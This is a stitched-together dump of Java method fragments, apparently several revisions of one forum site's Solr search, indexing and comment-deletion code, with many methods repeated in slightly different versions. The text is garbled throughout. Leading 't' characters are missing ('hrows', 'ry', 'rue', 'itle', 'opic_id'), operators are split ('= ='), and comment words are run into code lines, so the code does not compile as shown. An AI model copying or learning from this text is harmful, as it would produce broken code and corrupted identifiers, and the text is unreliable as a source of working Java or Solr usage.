public List < SearchItem > show ( Connection db ) hrows SQLException , UserErrorException , SolrServerException { SolrServer search = LorSearchSource . getConnection ( ) ; ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); params.set("qt", "dismax"); if(include != SEARCH_ALL){ params.add("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.add("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.add("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.add("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.add("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort:postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client send search query to solr QueryResponse response = search.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } return ImmutableList.copyOf(items); } 
public ModelAndView search ( @RequestParam ( value = " q " , required = false ) String q , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " section " , required = false ) Integer section , @RequestParam ( value = " sort " , required = false ) Integer sort , @RequestParam ( value = " username " , required = false ) String username , @RequestParam ( value = " usertopic " , required = false ) Boolean usertopic ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; boolean initial = q = = null ; params . put ( " initial " , initial ) ; if ( q = = null ) { q = " " ; } if ( usertopic = = null ) { usertopic = false ; } params . put ( " usertopic " , usertopic ) ; params . put ( " q " , q ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; int date = parseDate ( dateString ) ; params . put ( " date " , date ) ; if ( section = = null ) { section = 0 ; } params . put ( " section " , section ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( username = = null ) { username = " " ; } params . put ( " username " , username ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( q ) ; sv . setDate ( date ) ; sv . setInclude ( include ) ; sv . setSection ( section ) ; sv . setSort ( sort ) ; sv . setUser ( username ) ; sv . setUserTopic ( usertopic ) ; List < SearchItem > res = null ; long ime ; Connection db = null ; ry { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; res = sv . show ( db ) ; ime = System . currentTimeMillis ( ) - current ; } finally { if ( db ! = null ) { db . close ( ) ; } } params . put ( " result " , res ) ; params . put ( " ime " , ime ) ; } return new ModelAndView ( " search " , params ) ; } 
public static void delete ( SolrServer server , int msgid ) { try { server.deleteById((string) msgid); } catch (Exception ex) { logger.error("[SolR]: the index cannot be cleaned :"+ex.toString()); } } } 
public static void delete ( SolrServer server , int msgid ) { ry { server . deleteById ( ( Integer . oString ( msgid ) ) ) ; 
public ModelAndView deleteMessage ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( " reason " ) String reason , @RequestParam ( value = " bonus " , defaultValue = " 0 " ) int bonus , HttpServletRequest request ) hrows Exception { HttpSession session = request . getSession ( ) ; if ( ! Template . isSessionAuthorized ( session ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Template mpl = Template . getTemplate ( request ) ; Connection db = null ; SolrServer search = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView undelete ( HttpServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; SolrServer search = null ; ry { db = LorDataSource . getConnection ( ) ; 
public String deleteReplys ( int msgid , User user , boolean score ) hrows SQLException , ScriptErrorException , IOException , SolrServerException { return deleteReplys ( msgid , user , score , 0 ) ; } 
public static void delete ( SolrServer server , int msgid ) hrows IOException , SolrServerException { server . deleteById ( ( Integer . oString ( msgid ) ) ) ; server . commit ( ) ; } 
public static void delete ( SolrServer server , List < String > msgids ) hrows IOException , SolrServerException { server . deleteById ( msgids ) ; server . commit ( ) ; } 
public static void undeleteComments ( SolrServer server , int opicid , ResultSet comments ) hrows IOException , SolrServerException , SQLException { Collection < SolrInputDocument > docs = new ArrayList < SolrInputDocument > ( ) ; UpdateRequest updateRequest = new UpdateRequest ( ) ; updateRequest . setAction ( AbstractUpdateRequest . ACTION . COMMIT , false , false ) ; while ( comments . next ( ) ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comments . getString ( " section_id " ) ) ; doc . addField ( " section_id " , comments . getString ( " section_id " ) ) ; doc . addField ( " user_id " , comments . getInt ( " user_id " ) ) ; doc . addField ( " opic_id " , opicid ) ; doc . addField ( " itle " , comments . getString ( " itle " ) ) ; doc . addField ( " message " , comments . getString ( " message " ) ) ; doc . addField ( " postdate " , comments . getTimestamp ( " postdate " ) ) ; doc . addField ( " is_comment " , rue ) ; docs . add ( doc ) ; } updateRequest . add ( docs ) ; updateRequest . process ( server ) ; } 
public void handleMessage ( SearchQueueSender . UpdateMessage msgUpdate ) hrows SQLException , MessageNotFoundException , IOException , SolrServerException { logger . info ( " Indexing " + msgUpdate . getMsgid ( ) ) ; Connection db = LorDataSource . getConnection ( ) ; ry { Message msg = new Message ( db , msgUpdate . getMsgid ( ) ) ; 
public void updateMessageOnly ( final int msgid ) { jmsTemplate . send ( queue , new MessageCreator ( ) { @Override 
public Message createMessage ( Session session ) hrows JMSException { return session . createObjectMessage ( new UpdateMessage ( msgid ) ) ; } 
public static void undeleteComments ( SolrServer server , int opicid , ResultSet comments ) hrows IOException , SolrServerException , SQLException { Collection < SolrInputDocument > docs = new ArrayList < SolrInputDocument > ( ) ; UpdateRequest updateRequest = new UpdateRequest ( ) ; updateRequest . setAction ( AbstractUpdateRequest . ACTION . COMMIT , false , false ) ; while ( comments . next ( ) ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comments . getInt ( " id " ) ) ; doc . addField ( " section_id " , comments . getString ( " section_id " ) ) ; doc . addField ( " user_id " , comments . getInt ( " user_id " ) ) ; doc . addField ( " opic_id " , opicid ) ; doc . addField ( " itle " , comments . getString ( " itle " ) ) ; doc . addField ( " message " , comments . getString ( " message " ) ) ; doc . addField ( " postdate " , comments . getTimestamp ( " postdate " ) ) ; doc . addField ( " is_comment " , rue ) ; docs . add ( doc ) ; } updateRequest . add ( docs ) ; updateRequest . process ( server ) ; } 
public String apply ( @Nullable Comment comment ) { return Integer . oString ( comment . getId ( ) ) ; } 
public void handleMessage ( SearchQueueSender . UpdateComment msgUpdate ) hrows SQLException , MessageNotFoundException , IOException , SolrServerException { logger . info ( " Indexing " + msgUpdate . getMsgid ( ) ) ; Connection db = LorDataSource . getConnection ( ) ; PreparedStatement pst = null ; ry { Comment comment = new Comment ( db , msgUpdate . getMsgid ( ) ) ; 
private void updateMessage ( Message opic ) hrows IOException , SolrServerException { UpdateRequest updateRequest = new UpdateRequest ( ) ; updateRequest . setAction ( AbstractUpdateRequest . ACTION . COMMIT , false , false ) ; SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , opic . getId ( ) ) ; doc . addField ( " section_id " , opic . getId ( ) ) ; doc . addField ( " user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_id " , opic . getMessageId ( ) ) ; doc . addField ( " itle " , opic . getTitle ( ) ) ; doc . addField ( " message " , opic . getMessage ( ) ) ; Date postdate = opic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; updateRequest . add ( doc ) ; updateRequest . process ( solrServer ) ; } 
private void updateComment ( Comment comment , Message opic , int msgid , String message ) hrows IOException , SolrServerException { UpdateRequest updateRequest = new UpdateRequest ( ) ; updateRequest . setAction ( AbstractUpdateRequest . ACTION . COMMIT , false , false ) ; SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , msgid ) ; doc . addField ( " section_id " , opic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " opic_id " , comment . getTopic ( ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle = = null | | commentTitle . isEmpty ( ) ) { doc . addField ( " itle " , opic . getTitle ( ) ) ; } else { doc . addField ( " itle " , commentTitle ) ; } doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , rue ) ; updateRequest . add ( doc ) ; updateRequest . process ( solrServer ) ; } 
private void delete ( List < String > msgids ) hrows IOException , SolrServerException { solrServer . deleteById ( msgids ) ; solrServer . commit ( ) ; } 
public void updateMessageOnly ( int msgid ) { updateMessage ( msgid , false ) ; } 
public void updateMessage ( final int msgid , final boolean withComments ) { jmsTemplate . send ( queue , new MessageCreator ( ) { @Override 
public Message createMessage ( Session session ) hrows JMSException { return session . createObjectMessage ( new UpdateMessage ( msgid , withComments ) ) ; } 
public void updateComment ( final int msgid ) { jmsTemplate . send ( queue , new MessageCreator ( ) { @Override 
public Message createMessage ( Session session ) hrows JMSException { return session . createObjectMessage ( new UpdateComment ( msgid ) ) ; } 
public boolean isWithComments ( ) { return withComments ; } 
public List < Integer > deleteReplys ( int msgid , User user , boolean score ) hrows SQLException , ScriptErrorException { return deleteReplys ( msgid , user , score , 0 ) ; } 
public void deleteComment ( int msgid , String reason , User user , int scoreBonus ) hrows SQLException , ScriptErrorException { doDeleteComment ( msgid , reason , user , scoreBonus ) ; searchQueueSender . updateComment ( msgid ) ; } 
public List < Integer > deleteReplys ( int msgid , User user , boolean score ) hrows SQLException , ScriptErrorException { List < Integer > deleted = deleteReplys ( msgid , user , score , 0 ) ; searchQueueSender . updateComment ( deleted ) ; return deleted ; } 
public void handleMessage ( SearchQueueSender . UpdateComments msgUpdate ) hrows SQLException , MessageNotFoundException , IOException , SolrServerException { logger . info ( " Indexing " + msgUpdate . getMsgids ( ) ) ; Connection db = LorDataSource . getConnection ( ) ; PreparedStatement pst = null ; ry { pst = db . prepareStatement ( " SELECT message FROM msgbase WHERE id=? " ) ; 
private void delete ( int msgid ) hrows IOException , SolrServerException { solrServer . deleteById ( ( Integer . oString ( msgid ) ) ) ; solrServer . commit ( ) ; } 
public Message createMessage ( Session session ) hrows JMSException { return session . createObjectMessage ( new UpdateComments ( Collections . singletonList ( msgid ) ) ) ; } 
public void updateComment ( final List < Integer > msgids ) { jmsTemplate . send ( queue , new MessageCreator ( ) { @Override 
public Message createMessage ( Session session ) hrows JMSException { return session . createObjectMessage ( new UpdateComments ( msgids ) ) ; } 
public List < SearchItem > show ( SolrServer search , Connection db ) hrows SQLException , UserErrorException , SolrServerException { ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); params.set("qt", "dismax"); if(include != SEARCH_ALL){ params.add("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.add("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.add("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.add("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.add("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort","postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client send search query to solr QueryResponse response = search.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } return ImmutableList.copyOf(items); } 
public ModelAndView search ( @RequestParam ( value = " q " , required = false ) String q , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " section " , required = false ) Integer section , @RequestParam ( value = " sort " , required = false ) Integer sort , @RequestParam ( value = " username " , required = false ) String username , @RequestParam ( value = " usertopic " , required = false ) Boolean usertopic ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; boolean initial = q = = null ; params . put ( " initial " , initial ) ; if ( q = = null ) { q = " " ; } if ( usertopic = = null ) { usertopic = false ; } params . put ( " usertopic " , usertopic ) ; params . put ( " q " , q ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; int date = parseDate ( dateString ) ; params . put ( " date " , date ) ; if ( section = = null ) { section = 0 ; } params . put ( " section " , section ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( username = = null ) { username = " " ; } params . put ( " username " , username ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( q ) ; sv . setDate ( date ) ; sv . setInclude ( include ) ; sv . setSection ( section ) ; sv . setSort ( sort ) ; sv . setUser ( username ) ; sv . setUserTopic ( usertopic ) ; List < SearchItem > res = null ; long ime ; Connection db = null ; ry { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; res = sv . show ( solrServer , db ) ; ime = System . currentTimeMillis ( ) - current ; } finally { if ( db ! = null ) { db . close ( ) ; } } params . put ( " result " , res ) ; params . put ( " ime " , ime ) ; } return new ModelAndView ( " search " , params ) ; } 
public void updateMessage ( final int msgid , final boolean withComments ) { logger . debug ( " Scheduling reindex # " + msgid + " withComments= " + withComments ) ; jmsTemplate . send ( queue , new MessageCreator ( ) { @Override 
public ModelAndView reindexAll ( ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Connection db = LorDataSource . getConnection ( ) ; ry { mpl . initCurrentUser ( db ) ; 
public ModelAndView reindexAll ( ) { return new ModelAndView ( " search-reindex " ) ; } 
public void handleMessage ( SearchQueueSender . UpdateMessage msgUpdate ) hrows SQLException , MessageNotFoundException , IOException , SolrServerException { logger . info ( " Indexing " + msgUpdate . getMsgid ( ) ) ; Connection db = LorDataSource . getConnection ( ) ; ry { reindexMessage ( db , msgUpdate . getMsgid ( ) , msgUpdate . isWithComments ( ) ) ; 
private void reindexMessage ( Connection db , int msgid , boolean withComments ) hrows IOException , SolrServerException , SQLException , MessageNotFoundException { Message msg = new Message ( db , msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { delete ( msg . getId ( ) ) ; } if ( withComments ) { CommentList commentList = CommentList . getCommentList ( db , msg , false ) ; 
public String apply ( @Nullable Comment comment ) { return Integer . oString ( comment . getId ( ) ) ; } 
public void handleMessage ( SearchQueueSender . UpdateMonth msgUpdate ) hrows SQLException , MessageNotFoundException , IOException , SolrServerException { int month = msgUpdate . getMonth ( ) ; int year = msgUpdate . getYear ( ) ; logger . info ( " Indexing month " + year + '/' + month ) ; Connection db = LorDataSource . getConnection ( ) ; ry { long startTime = System . nanoTime ( ) ; 
public void updateMessage ( final int msgid , final boolean withComments ) { logger . info ( " Scheduling reindex # " + msgid + " withComments= " + withComments ) ; jmsTemplate . send ( queue , new MessageCreator ( ) { @Override 
public void updateMonth ( final int year , final int month ) { logger . info ( " Scheduling reindex by date " + year + '/' + month ) ; jmsTemplate . send ( queue , new MessageCreator ( ) { @Override 
public Message createMessage ( Session session ) hrows JMSException { return session . createObjectMessage ( new UpdateMonth ( year , month ) ) ; } 
private SolrInputDocument processComment ( Message opic , Comment comment , String message ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comment . getId ( ) ) ; doc . addField ( " section_id " , opic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " opic_id " , comment . getTopic ( ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle = = null | | commentTitle . isEmpty ( ) ) { doc . addField ( " itle " , opic . getTitle ( ) ) ; } else { doc . addField ( " itle " , commentTitle ) ; } doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , rue ) ; return doc ; } 
private void updateComment ( Comment comment , Message opic , String message ) hrows IOException , SolrServerException { UpdateRequest updateRequest = new UpdateRequest ( ) ; updateRequest . setAction ( AbstractUpdateRequest . ACTION . COMMIT , false , false ) ; updateRequest . add ( processComment ( opic , comment , message ) ) ; updateRequest . process ( solrServer ) ; } 
private void reindexMessage ( Connection db , int msgid , boolean withComments ) hrows IOException , SolrServerException , SQLException , MessageNotFoundException { Message msg = new Message ( db , msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { solrServer . deleteById ( ( Integer . oString ( msg . getId ( ) ) ) ) ; } if ( withComments ) { CommentList commentList = CommentList . getCommentList ( db , msg , false ) ; 
private void updateMessage ( Message opic ) hrows IOException , SolrServerException { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , opic . getId ( ) ) ; doc . addField ( " section_id " , opic . getId ( ) ) ; doc . addField ( " user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_id " , opic . getMessageId ( ) ) ; doc . addField ( " itle " , opic . getTitle ( ) ) ; doc . addField ( " message " , opic . getMessage ( ) ) ; Date postdate = opic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; solrServer . add ( doc ) ; } 
private static SolrInputDocument processComment ( Message opic , Comment comment , String message ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comment . getId ( ) ) ; doc . addField ( " section_id " , opic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " opic_id " , comment . getTopic ( ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle = = null | | commentTitle . isEmpty ( ) ) { doc . addField ( " itle " , opic . getTitle ( ) ) ; } else { doc . addField ( " itle " , commentTitle ) ; } doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , rue ) ; return doc ; } 
private void updateComment ( Comment comment , Message opic , String message ) hrows IOException , SolrServerException { solrServer . add ( processComment ( opic , comment , message ) ) ; } 
public void optimize ( ) hrows IOException , SolrServerException { logger . info ( " Optimizing solr index " ) ; solrServer . optimize ( ) ; logger . info ( " Finished solr index optimization " ) ; } 
private void updateMessage ( Message opic ) hrows IOException , SolrServerException { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , opic . getId ( ) ) ; doc . addField ( " section_id " , opic . getSectionId ( ) ) ; doc . addField ( " user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_id " , opic . getMessageId ( ) ) ; doc . addField ( " itle " , opic . getTitle ( ) ) ; doc . addField ( " message " , opic . getMessage ( ) ) ; Date postdate = opic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; solrServer . add ( doc ) ; } 
public ModelAndView search ( @RequestParam ( value = " q " , defaultValue = " " ) String q , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " section " , required = false ) Integer section , @RequestParam ( value = " sort " , required = false ) Integer sort , @RequestParam ( value = " username " , required = false ) String username , @RequestParam ( value = " usertopic " , required = false ) Boolean usertopic ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; boolean initial = q . isEmpty ( ) ; params . put ( " initial " , initial ) ; if ( usertopic = = null ) { usertopic = false ; } params . put ( " usertopic " , usertopic ) ; params . put ( " q " , q ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; int date = parseDate ( dateString ) ; params . put ( " date " , date ) ; if ( section = = null ) { section = 0 ; } params . put ( " section " , section ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( username = = null ) { username = " " ; } params . put ( " username " , username ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( q ) ; sv . setDate ( date ) ; sv . setInclude ( include ) ; sv . setSection ( section ) ; sv . setSort ( sort ) ; sv . setUser ( username ) ; sv . setUserTopic ( usertopic ) ; List < SearchItem > res = null ; long ime ; Connection db = null ; ry { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; res = sv . show ( solrServer , db ) ; ime = System . currentTimeMillis ( ) - current ; } finally { if ( db ! = null ) { db . close ( ) ; } } params . put ( " result " , res ) ; params . put ( " ime " , ime ) ; } return new ModelAndView ( " search " , params ) ; } 
public ModelAndView search ( @RequestParam ( value = " q " , defaultValue = " " ) String q , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " section " , required = false ) Integer section , @RequestParam ( value = " sort " , required = false ) Integer sort , @RequestParam ( value = " username " , required = false ) String username , @RequestParam ( value = " usertopic " , defaultValue = " false " ) boolean usertopic ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; boolean initial = q . isEmpty ( ) ; params . put ( " initial " , initial ) ; params . put ( " usertopic " , usertopic ) ; params . put ( " q " , q ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; int date = parseDate ( dateString ) ; params . put ( " date " , date ) ; if ( section = = null ) { section = 0 ; } params . put ( " section " , section ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( username = = null ) { username = " " ; } params . put ( " username " , username ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( q ) ; sv . setDate ( date ) ; sv . setInclude ( include ) ; sv . setSection ( section ) ; sv . setSort ( sort ) ; sv . setUser ( username ) ; sv . setUserTopic ( usertopic ) ; List < SearchItem > res = null ; long ime ; Connection db = null ; ry { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; res = sv . show ( solrServer , db ) ; ime = System . currentTimeMillis ( ) - current ; } finally { if ( db ! = null ) { db . close ( ) ; } } params . put ( " result " , res ) ; params . put ( " ime " , ime ) ; } return new ModelAndView ( " search " , params ) ; } 
public List < SearchItem > show ( SolrServer search , Connection db ) hrows SQLException , UserErrorException , SolrServerException { ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); params.set("qt", "dismax"); if(include != SEARCH_ALL){ params.add("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.add("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.add("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.add("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.add("fq","topic_user_id:"+user.getId()); } else { params.add("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort","postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client send search query to solr QueryResponse response = search.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } return ImmutableList.copyOf(items); } 
private void updateMessage ( Message opic ) hrows IOException , SolrServerException { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , opic . getId ( ) ) ; doc . addField ( " section_id " , opic . getSectionId ( ) ) ; doc . addField ( " user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_id " , opic . getMessageId ( ) ) ; doc . addField ( " itle " , opic . getTitle ( ) ) ; doc . addField ( " message " , opic . getMessage ( ) ) ; Date postdate = opic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; solrServer . add ( doc ) ; } 
private static SolrInputDocument processComment ( Message opic , Comment comment , String message ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comment . getId ( ) ) ; doc . addField ( " section_id " , opic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " opic_user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_id " , comment . getTopic ( ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle = = null | | commentTitle . isEmpty ( ) ) { doc . addField ( " itle " , opic . getTitle ( ) ) ; } else { doc . addField ( " itle " , commentTitle ) ; } doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , rue ) ; return doc ; } 
public String apply ( Comment comment ) { return Integer . oString ( comment . getId ( ) ) ; } 
public HttpClient getObject ( ) hrows Exception { return httpClient ; } 
public void afterPropertiesSet ( ) hrows Exception { httpClient = new HttpClient ( connectionManager ) ; Credentials credentials = new UsernamePasswordCredentials ( username , password ) ; httpClient . getState ( ) . setCredentials ( new AuthScope ( host , port ) , credentials ) ; httpClient . getParams ( ) . setAuthenticationPreemptive ( rue ) ; } 
public ModelAndView reindexCurrentMonth ( ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Connection db = LorDataSource . getConnection ( ) ; ry { mpl . initCurrentUser ( db ) ; 
private void reindexMessage ( Connection db , int msgid , boolean withComments ) hrows IOException , SolrServerException , SQLException , MessageNotFoundException { Message msg = new Message ( db , msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { logger . info ( " Deleting message " + msgid + " from solr " ) ; solrServer . deleteById ( ( Integer . oString ( msg . getId ( ) ) ) ) ; } if ( withComments ) { CommentList commentList = CommentList . getCommentList ( db , msg , false ) ; 
private void reindexMessage ( Connection db , int msgid , boolean withComments ) hrows IOException , SolrServerException , SQLException , MessageNotFoundException { Message msg = new Message ( db , msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { logger . info ( " Deleting message " + msgid + " from solr " ) ; solrServer . deleteById ( ( Integer . oString ( msg . getId ( ) ) ) ) ; } if ( withComments ) { CommentList commentList = CommentList . getCommentList ( db , msg , rue ) ; 
public void deleteComment ( int msgid , String reason , User user , int scoreBonus ) hrows SQLException , ScriptErrorException { doDeleteComment ( msgid , reason , user , scoreBonus ) ; } 
public QueryResponse performSearch ( SolrServer search , Connection db ) hrows SQLException , UserErrorException , SolrServerException { ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); params.set("qt", "dismax"); if(include != SEARCH_ALL){ params.add("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.add("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.add("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.add("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.add("fq","topic_user_id:"+user.getId()); } else { params.add("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort","postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client return search.query(params); } 
public ModelAndView search ( @RequestParam ( value = " q " , defaultValue = " " ) String q , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " section " , required = false ) Integer section , @RequestParam ( value = " sort " , required = false ) Integer sort , @RequestParam ( value = " username " , required = false ) String username , @RequestParam ( value = " usertopic " , defaultValue = " false " ) boolean usertopic ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; boolean initial = q . isEmpty ( ) ; params . put ( " initial " , initial ) ; params . put ( " usertopic " , usertopic ) ; params . put ( " q " , q ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; int date = parseDate ( dateString ) ; params . put ( " date " , date ) ; if ( section = = null ) { section = 0 ; } params . put ( " section " , section ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( username = = null ) { username = " " ; } params . put ( " username " , username ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( q ) ; sv . setDate ( date ) ; sv . setInclude ( include ) ; sv . setSection ( section ) ; sv . setSort ( sort ) ; sv . setUser ( username ) ; sv . setUserTopic ( usertopic ) ; Connection db = null ; ry { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; QueryResponse response = sv . performSearch ( solrServer , db ) ; SolrDocumentList list = response . getResults ( ) ; ArrayList < SearchItem > res = new ArrayList < SearchItem > ( 100 ) ; for ( SolrDocument doc : list ) { res . add ( new SearchItem ( db , doc ) ) ; } long ime = System . currentTimeMillis ( ) - current ; params . put ( " result " , res ) ; params . put ( " searchTime " , response . getElapsedTime ( ) ) ; params . put ( " ime " , ime ) ; } finally { if ( db ! = null ) { db . close ( ) ; } } } return new ModelAndView ( " search " , params ) ; } 
